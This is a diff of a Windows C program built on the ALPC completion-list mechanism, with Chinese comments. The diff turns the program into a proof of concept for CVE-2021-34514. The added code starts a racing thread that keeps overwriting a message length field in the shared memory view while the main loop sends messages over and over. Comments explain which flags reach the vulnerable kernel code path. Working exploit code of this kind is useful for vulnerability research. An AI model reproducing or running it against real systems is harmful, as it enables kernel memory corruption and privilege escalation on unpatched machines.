@@ -1,6 +1,6 @@
 //alpc完成列表机制通信
 //部分代码取自https://csandker.io/2022/05/24/Offensive-Windows-IPC-3-ALPC.html
-
+//此代码也是 CVE-2021-34514的poc
 
 #include <windows.h>
 #include <stdio.h>
@@ -68,7 +68,7 @@ PPORT_MESSAGE CreateMsgMem(PPORT_MESSAGE PortMessage, SIZE_T MessageSize, LPVOID
 	return(lpMem);
 }
 
-
+ULONG adder;
 
 void DumpHex(const void* data, size_t size) {
 	char ascii[17];
@@ -210,15 +210,10 @@ PORT_MESSAGE     pmReceived = { 0 };
 void th() {
 
 
-
-	PPORT_MESSAGE lpMem = (PPORT_MESSAGE)viewAttr.ViewBase;
+	
 	while (true)
 	{
-		lpMem->u1.s1.DataLength = 0x300 - 0x28;
-		lpMem->u1.s1.TotalLength = 0x300;
-		Sleep(1);
-		lpMem->u1.s1.DataLength = 0x4000 - 0x28;
-		lpMem->u1.s1.TotalLength = 0x4000;
+		*(USHORT*)(0x304002) = 0xffff;
 	}
 }
 INT main()
@@ -356,16 +351,14 @@ INT main()
 		ALPC_PORT_COMPLETION_LIST_INFORMATION CompletionList = { 0 };
 		PALPC_COMPLETION_LIST_HEADER CompletionListHEADER = { 0 };
 		CompletionListHEADER = (PALPC_COMPLETION_LIST_HEADER)test2;
-
 	
-		
 		CompletionList.Buffer = CompletionListHEADER;
 		CompletionList.Buffer->StartMagic = 0x1000;
 		CompletionList.Size = 0x10000;
 		//CompletionList.Size必须是足够大的 必须要大于Buffer->DataOffset加上消息总长度 并且要申请这么大内存(刚才调用的VirtualAlloc)
 		CompletionList.ConcurrencyCount = 0x100;
 		//CompletionList.Buffer->DataOffset不需要设置,它似乎是系统自动分配的
-
+		//NtAlpcSetInformation >> AlpcpInitializeCompletionList
 		/*AlpcpInitializeCompletionList(
 			Object,
 			v32,                                 CompletionListHEADER->StartMagic
@@ -373,13 +366,8 @@ INT main()
 			*((unsigned int*)v11 + 3),			 CompletionList.ConcurrencyCount
 			*((_DWORD*)v11 + 4),			     CompletionList.AttributeFlags
 			v8);*/
-	/*	if (((ULONG)test & 0xFFF) != 0 || (((ULONG)test - 0x4000) > 0x3FFFC000)) {
-			NtAlpcDeleteSectionView(hConnectionPort, 0, adva.ViewBase);
-			exit(-1);
-		}*/
 
-
-
+		//消息标志不能为空 否则无法触发漏洞代码路径
 		CompletionList.AttributeFlags = ALPC_MESSAGE_SECURITY_ATTRIBUTE;
 
 		lSuccess = NtAlpcSetInformation(hConnectionPort, AlpcRegisterCompletionListInformation, &CompletionList, 24);
@@ -448,7 +436,7 @@ INT main()
 
 		ULONG64 test = (ULONG64)CompletionListHEADER;
 
-		
+		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)th, 0, 0, 0);
 		while (true)
 		{
 
@@ -466,8 +454,11 @@ INT main()
 				NULL			// no timeout
 			);
 		
-			
+			adder = CompletionList.Buffer->DataOffset;
 			ULONG type = *(ULONG*)(test + CompletionList.Buffer->DataOffset + 4);
+			
+			
+
 
 		    //一般情况下使用lpMem->u2.s2.Type判断消息类型
 		    //完成列表由于是异步 所以要使用事件通知辅助来通信
@@ -484,7 +475,7 @@ INT main()
 				case 0x2001:
 				
 					wprintf(L"[*] CompletionList.Buffer->DataOffset  %x \n", CompletionList.Buffer->DataOffset);
-			
+					
 					DumpHex((ULONG*)(test + CompletionList.Buffer->DataOffset), 0x50);
 					wprintf(L"---------------------------------\n");
 					if (!NT_SUCCESS(lSuccess)) {
@@ -579,26 +570,38 @@ INT main()
 //		DumpHex(viewAttr.ViewBase, 0x50);
 		//CreateThread(0, 0, (LPTHREAD_START_ROUTINE)th, 0, 0, 0);
 	
-		SetEvent(handle);
-		lSuccess = NtAlpcSendWaitReceivePort(
-			hConnectionPort,
-			NULL,
-			lpMem,		// SendMessage_
-			NULL,		// SendMessageAttributes
-			NULL,		// receiving message
-			NULL,						// receiving message length
-			NULL,			// receive message attributes
-			NULL					// no timeout
-		);
-		if (!NT_SUCCESS(lSuccess)) {
-			wprintf(L"[-] NtAlpcSendWaitReceivePort Error: 0x%X\n", lSuccess);
-			exit(-1);
-
+		while (true)
+		{
+			SetEvent(handle);
+			lSuccess = NtAlpcSendWaitReceivePort(
+				hConnectionPort,
+				NULL,
+				lpMem,		// SendMessage_
+				NULL,		// SendMessageAttributes
+				NULL,		// receiving message
+				NULL,						// receiving message length
+				NULL,			// receive message attributes
+				NULL					// no timeout
+			);
 		}
-		else wprintf(L"[+] NtAlpcSendWaitReceivePort Success \n", pwsPortName);
+		//SetEvent(handle);
+		//lSuccess = NtAlpcSendWaitReceivePort(
+		//	hConnectionPort,
+		//	NULL,
+		//	lpMem,		// SendMessage_
+		//	NULL,		// SendMessageAttributes
+		//	NULL,		// receiving message
+		//	NULL,						// receiving message length
+		//	NULL,			// receive message attributes
+		//	NULL					// no timeout
+		//);
+		//if (!NT_SUCCESS(lSuccess)) {
+		//	wprintf(L"[-] NtAlpcSendWaitReceivePort Error: 0x%X\n", lSuccess);
+		//	exit(-1);
 
-		
-	
+		//}
+		//else wprintf(L"[+] NtAlpcSendWaitReceivePort Success \n", pwsPortName);
+
 
 	}
 	
